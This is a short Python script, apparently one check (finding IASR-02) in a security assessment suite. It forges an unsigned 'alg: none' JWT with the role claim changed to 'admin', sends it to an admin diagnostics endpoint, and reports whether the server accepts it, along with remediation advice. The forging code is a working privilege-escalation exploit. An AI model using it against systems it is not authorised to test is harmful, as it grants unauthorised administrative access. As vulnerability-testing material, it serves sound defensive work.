import jwt
from common import BASE_URL, b64url_json, finding, get_demo_token, session

def run() -> dict:
    s = session()
    token = get_demo_token(s)
    claims = jwt.decode(token, options={"verify_signature": False})
    claims["role"] = "admin"
    forged = f"{b64url_json({'alg': 'none', 'typ': 'JWT'})}.{b64url_json(claims)}."
    response = s.get(f"{BASE_URL}/api/admin/diagnostics", headers={"Authorization": f"Bearer {forged}"}, timeout=5)
    vulnerable = response.status_code == 200
    evidence = f"Unsigned token accepted; response={response.text}" if vulnerable else f"Unsigned token rejected with HTTP {response.status_code}"
    return finding("IASR-02", "Unsigned JWT accepted", "Critical", vulnerable, evidence, "Explicitly allow only required signing algorithms and reject alg=none tokens.")

if __name__ == "__main__":
    print(run())
